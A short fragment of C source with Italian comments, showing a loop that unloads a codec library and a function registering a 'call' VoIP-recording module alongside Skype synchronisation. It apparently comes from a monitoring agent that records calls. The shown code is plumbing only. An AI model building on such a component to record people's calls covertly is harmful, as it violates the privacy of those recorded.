		// Cerca a tutti i costi di chiudere la libreria
		// (anche se dovrebbe riuscire al primo tentativo)
		for (i=0; i<MAX_FREE_TRIES; i++) {
			// Non vi sono race sulla libreria visto che il thread di dispatch
			// e' bloccato a questo punto (in maniera sicura) e la Start (dove
			// carica la libreria) viene sempre eseguita da una action (cosi' 
			// come la unregisterm che e' esguita dall'action uninstall).
			if (FreeLibrary(codec_handle))
				break;
			Sleep(FREE_SLEEP_TIME);
		}
		codec_handle = NULL;
	}
	return 1;
}

void PM_VoipRecordRegister()
{
	AM_MonitorRegister(L"call", PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
	InitializeCriticalSection(&skype_critic_sec);
}